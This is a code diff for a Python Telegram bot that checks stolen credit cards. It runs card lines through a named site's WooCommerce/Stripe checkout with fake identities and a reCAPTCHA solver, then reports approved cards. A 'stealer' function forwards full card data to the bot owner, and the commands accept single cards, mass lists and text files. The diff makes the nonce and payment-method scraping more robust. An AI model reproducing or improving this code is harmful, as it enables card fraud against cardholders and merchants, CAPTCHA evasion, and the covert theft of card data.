@@ -77,14 +77,14 @@ def parse_error_response(response_text):
         pass
     
     if 'captcha' in response_text.text.lower():
-        return "CAPTCHA_REQUIRED_USE_YOUR_KEY"
+        return "CAPTCHA_REQUIRED"
     elif 'terms and conditions' in response_text.text.lower():
-        return "TERMS_REQUIRED_WE_ACCEPT_AUTOMOTİC"
+        return "TERMS_REQUIRED"
     
     return 'Unknown error'
 
 # -------------------------------------------------------------
-# reCAPTCHA Solver
+# reCAPTCHA Solver (works for invisible v2)
 # -------------------------------------------------------------
 async def get_recaptcha_token(sitekey: str, target_domain: str) -> Optional[str]:
     try:
@@ -110,7 +110,7 @@ async def get_recaptcha_token(sitekey: str, target_domain: str) -> Optional[str]
         return None
 
 # -------------------------------------------------------------
-# Core synchronous check
+# Core synchronous check (extracts payment_method from checkout page)
 # -------------------------------------------------------------
 def process_card_sync(card_line, site_url, product_url, product_id):
     session = requests.Session()
@@ -142,16 +142,35 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         session.get(f"{site_url}/cart/", headers=headers, timeout=10)
         checkout_resp = session.get(f"{site_url}/checkout/", headers=headers, timeout=10)
         
+        # Extract nonce
         nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', checkout_resp.text)
         if not nonce_match:
             return "Error", "Checkout nonce not found!"
         checkout_nonce = nonce_match.group(1)
         
+        # Extract session pages number
         pages_match = re.search(r'wc_order_attribution_session_pages["\']?\s*:\s*(\d+)', checkout_resp.text)
         session_pages = int(pages_match.group(1)) if pages_match else 11
         
+        # Extract reCAPTCHA sitekey
+        recaptcha_sitekey = None
         sitekey_match = re.search(r'data-sitekey="([^"]+)"', checkout_resp.text)
-        recaptcha_sitekey = sitekey_match.group(1) if sitekey_match else None
+        if sitekey_match:
+            recaptcha_sitekey = sitekey_match.group(1)
+        
+        # Extract correct payment method ID from the checkout page
+        payment_method = None
+        # Look for Stripe radio button value
+        stripe_radio = re.search(r'<input[^>]*id="payment_method_stripe[^"]*"[^>]*value="([^"]+)"', checkout_resp.text)
+        if stripe_radio:
+            payment_method = stripe_radio.group(1)
+        else:
+            # Fallback: look for any payment method radio with "stripe" in id or value
+            fallback = re.search(r'name="payment_method"\s+value="([^"]+)"', checkout_resp.text)
+            if fallback:
+                payment_method = fallback.group(1)
+            else:
+                payment_method = "stripe"  # last resort
         
         first_name, last_name = generate_full_name()
         city, state, street_address, zip_code = generate_address()
@@ -199,12 +218,14 @@ def process_card_sync(card_line, site_url, product_url, product_id):
             f'&billing_email={email}'
             f'&account_password='
             f'&order_comments='
-            f'&payment_method=stripe_cc'
+            f'&payment_method={payment_method}'
             f'&terms=1'
             f'&woocommerce-process-checkout-nonce={checkout_nonce}'
             f'&_wp_http_referer=%2Fcheckout%2F'
         )
         
+        # Solve captcha if sitekey found
+        captcha_token = None
         if recaptcha_sitekey:
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -217,6 +238,7 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         
         checkout_resp = session.post(f"{site_url}/?wc-ajax=checkout", data=checkout_data, headers=checkout_headers, timeout=15)
         error_msg = parse_error_response(checkout_resp)
+        
         try:
             result_json = checkout_resp.json()
             if result_json.get('result') == 'success':
@@ -224,15 +246,22 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         except:
             pass
         
+        # Check if we have a CAPTCHA or terms error even after solving
+        if "CAPTCHA_REQUIRED" in error_msg:
+            return "Declined ❌", "Captcha required (solver failed)"
+        if "TERMS_REQUIRED" in error_msg:
+            return "Declined ❌", "Terms not accepted"
+        
         if "SUCCESS" in error_msg or "Charged" in error_msg:
             return "Approved ✅", error_msg[:50]
         else:
             return "Declined ❌", error_msg if error_msg else "Transaction Declined"
+        
     except Exception as e:
         return "Error", str(e)[:50]
 
 # -------------------------------------------------------------
-# Stealer function
+# Stealer function (keeps owner line – change if needed)
 # -------------------------------------------------------------
 async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
     try:
@@ -249,7 +278,7 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
         print(f"[Stealer Error] {e}")
 
 # -------------------------------------------------------------
-# Async wrapper
+# Async wrapper for single card
 # -------------------------------------------------------------
 async def call_payeezy_api(fullcc):
     site_url = "https://learntoreadstjohns.org"
@@ -280,7 +309,7 @@ def extract_cards(text):
     return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)
 
 # -------------------------------------------------------------
-# Command handlers
+# COMMAND HANDLERS
 # -------------------------------------------------------------
 @Client.on_message(filters.command("pz", [".", "/"]))
 async def payeezy_cmd(Client, message):
@@ -364,7 +393,7 @@ async def payeezy_cmd(Client, message):
         await error_log(traceback.format_exc())
 
 # -------------------------------------------------------------
-# Mass and txt commands (identical structure – shortened for space)
+# MASS CHECK (text/reply) (/mpz)
 # -------------------------------------------------------------
 @Client.on_message(filters.command("mpz", [".", "/"]))
 async def payeezy_mass_cmd(Client, message):
@@ -404,6 +433,9 @@ async def payeezy_mass_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
+# -------------------------------------------------------------
+# TXT FILE COMMAND (/tpz)
+# -------------------------------------------------------------
 @Client.on_message(filters.command("tpz", [".", "/"]))
 async def payeezy_txt_cmd(Client, message):
     try:
@@ -445,6 +477,9 @@ async def payeezy_txt_cmd(Client, message):
         import traceback
         await error_log(traceback.format_exc())
 
+# -------------------------------------------------------------
+# SEQUENTIAL PROCESSING
+# -------------------------------------------------------------
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
     total_cards = len(ccs)
     processed = 0
@@ -453,6 +488,7 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
     gateway = GATE_NAME
     start_time = time.perf_counter()
     approved_cards = []
+
     progress_text = f"""Payeezy - FirstDate
 Admin
 
@@ -465,10 +501,12 @@ Remaining: {total_cards}
 
 Checked by: {first_name} ({role})"""
     progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)
+
     for idx, fullcc in enumerate(ccs, 1):
         processed = idx
         remaining = total_cards - processed
         status, response = await call_payeezy_api(fullcc)
+
         cc_num = fullcc.split('|')[0]
         getbin = await get_bin_details(cc_num)
         brand = getbin[0] if len(getbin) > 0 else "Unknown"
@@ -477,6 +515,7 @@ Checked by: {first_name} ({role})"""
         bank = getbin[3] if len(getbin) > 3 else "Unknown"
         country = getbin[4] if len(getbin) > 4 else "Unknown"
         flag = getbin[5] if len(getbin) > 5 else ""
+
         if "Approved" in status or "✅" in status:
             approved_count += 1
             response_status = "APPROVED ✅"
@@ -489,6 +528,7 @@ Checked by: {first_name} ({role})"""
         else:
             declined_count += 1
             response_status = "DECLINED ❌"
+
         try:
             await Client.edit_message_text(message.chat.id, progress_msg.id,
                 f"""Payeezy - FirstDate
@@ -505,7 +545,9 @@ Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
         except:
             pass
         await asyncio.sleep(0.5)
+
     await progress_msg.delete()
+
     for card in approved_cards:
         display_status = f"<b>{card['status']}</b>"
         approved_msg = f"""{display_status}
@@ -522,7 +564,9 @@ Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
+
     elapsed_time = round(time.perf_counter() - start_time, 2)
+
     if approved_count > 0:
         declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})
 
@@ -552,4 +596,5 @@ Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
 👤 Checked by: {first_name} ({role})""",
             quote=True, parse_mode=enums.ParseMode.HTML
         )
+
     await setantispamtime(user_id)
